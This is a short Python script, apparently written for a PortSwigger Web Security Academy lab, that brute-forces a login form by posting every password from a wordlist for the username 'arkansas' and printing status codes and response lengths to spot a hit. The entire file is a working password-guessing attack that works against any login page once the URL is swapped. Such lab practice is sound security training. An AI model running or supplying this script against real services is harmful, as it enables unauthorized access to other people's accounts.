import requests
import time

# Define the URL
url = "https://0aa800b50424bd66805b301c009a00f1.web-security-academy.net/login"  # Replace with the actual URL

wordlist_path = "passwords.txt"

# Read the wordlist
with open(wordlist_path, 'r') as file:
    payloads = file.read().splitlines()

# Iterate over each payload in the wordlist
temp = None
for payload in payloads:
    # Define the parameters for the POST request
    params = {'username': 'arkansas', 'password': f'{payload}'}
    response = requests.post(url, data=params)
    
    print(f"Payload: {payload} | status_code: {response.status_code} | length response: {len(response.text)}")